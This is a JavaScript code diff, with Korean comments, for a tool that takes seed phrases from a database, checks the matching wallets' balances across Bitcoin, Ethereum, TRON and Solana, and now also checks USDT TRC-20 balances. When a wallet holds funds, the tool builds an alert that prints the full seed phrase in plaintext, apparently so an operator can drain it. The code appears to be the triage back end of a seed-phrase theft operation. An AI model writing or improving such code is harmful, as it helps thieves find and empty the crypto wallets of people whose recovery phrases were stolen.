@@ -182,12 +182,20 @@ async function checkTron(phrase) {
       'https://api.tronstack.io/wallet/getaccount',
     ];
 
+    const USDT_TRC20 = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // USDT TRC-20 컨트랙트
+
     for (const url of apis) {
       try {
         const { data } = await axios.post(url, { address, visible: true }, { timeout: 10000 });
         const trx = (data.balance || 0) / 1e6;
-        console.log(`[TRON] Balance: ${trx} TRX`);
-        return { network: 'tron', symbol: 'TRX', address, balance: trx };
+        // TRC-20 USDT 잔고 파싱
+        let usdt = 0;
+        if (Array.isArray(data.trc20)) {
+          const entry = data.trc20.find(t => t[USDT_TRC20] !== undefined);
+          if (entry) usdt = parseInt(entry[USDT_TRC20] || 0) / 1e6;
+        }
+        console.log(`[TRON] TRX: ${trx}, USDT: ${usdt}`);
+        return { network: 'tron', symbol: 'TRX', address, balance: trx, usdt };
       } catch (e) {
         console.log(`[TRON] API 실패: ${url} → ${e.message}`);
       }
@@ -251,14 +259,14 @@ const checkMultiChainBalance = checkAllChains;
 // ─────────────────────────────────────────
 //  DB 저장 (btc/eth/tron/sol 각각 + balance/usdt_balance)
 // ─────────────────────────────────────────
-async function saveBalanceToDB(seedId, btc, eth, tron, sol) {
+async function saveBalanceToDB(seedId, btc, eth, tron, sol, usdt = 0) {
   const maxBalance = Math.max(btc, eth, tron, sol, 0);
   try {
     await db.pool.query(
-      `UPDATE seeds SET balance=?, btc=?, eth=?, tron=?, sol=? WHERE id=?`,
-      [maxBalance, btc || null, eth || null, tron || null, sol || null, seedId]
+      `UPDATE seeds SET balance=?, btc=?, eth=?, tron=?, sol=?, usdt_balance=? WHERE id=?`,
+      [maxBalance, btc || null, eth || null, tron || null, sol || null, usdt || null, seedId]
     );
-    console.log(`💾 DB 저장: ID=${seedId} BTC=${btc} ETH=${eth} TRON=${tron} SOL=${sol}`);
+    console.log(`💾 DB 저장: ID=${seedId} BTC=${btc} ETH=${eth} TRON=${tron} SOL=${sol} USDT=${usdt}`);
   } catch (e) {
     console.error('❌ DB 저장 실패:', e.message);
   }
@@ -284,17 +292,21 @@ async function processSeed(seedData) {
   try {
     const results = await checkAllChains(phrase);
 
-    const getbal = (net) => results.find(r => r.network === net)?.balance || 0;
-    const btc  = getbal('btc');
-    const eth  = getbal('eth');
-    const tron = getbal('tron');
-    const sol  = getbal('sol');
+    const getbal  = (net) => results.find(r => r.network === net)?.balance || 0;
+    const getUsdt = (net) => results.find(r => r.network === net)?.usdt    || 0;
+    const btc   = getbal('btc');
+    const eth   = getbal('eth');
+    const tron  = getbal('tron');
+    const sol   = getbal('sol');
+    // USDT: TRON TRC-20 기준 (추후 ETH ERC-20 추가 가능)
+    const usdt  = getUsdt('tron');
 
-    await saveBalanceToDB(id, btc, eth, tron, sol);
+    await saveBalanceToDB(id, btc, eth, tron, sol, usdt);
 
-    const chainsWithBalance = results.filter(r => (r.balance || 0) > CONFIG.MIN_BALANCE);
+    // 잔고 있는 체인: native 잔고 또는 USDT 잔고 있는 경우 포함
+    const chainsWithBalance = results.filter(r => (r.balance || 0) > CONFIG.MIN_BALANCE || (r.usdt || 0) > CONFIG.MIN_BALANCE);
 
-    console.log(`📊 요약: BTC=${btc} ETH=${eth} TRON=${tron} SOL=${sol} (잔고 있는 체인: ${chainsWithBalance.length}개)`);
+    console.log(`📊 요약: BTC=${btc} ETH=${eth} TRON=${tron} SOL=${sol} USDT(TRC-20)=${usdt} (잔고 있는 체인: ${chainsWithBalance.length}개)`);
 
     if (chainsWithBalance.length > 0) {
       let msg = `🚨 <b>잔고 발견!</b>\n\n`;
@@ -307,6 +319,7 @@ async function processSeed(seedData) {
         msg += `━━━━━━━━━━━━━━━━━━\n`;
         msg += `🌐 <b>${c.network.toUpperCase()}</b>\n`;
         msg += `💰 <b>잔고:</b> ${c.balance} ${c.symbol}\n`;
+        if ((c.usdt || 0) > 0) msg += `💵 <b>USDT:</b> ${c.usdt} USDT\n`;
         if (c.address) msg += `🔑 <b>주소:</b> <code>${c.address}</code>\n`;
       }
       msg += `\n━━━━━━━━━━━━━━━━━━\n📝 <b>시드 문구:</b>\n<code>${phrase}</code>\n━━━━━━━━━━━━━━━━━━`;
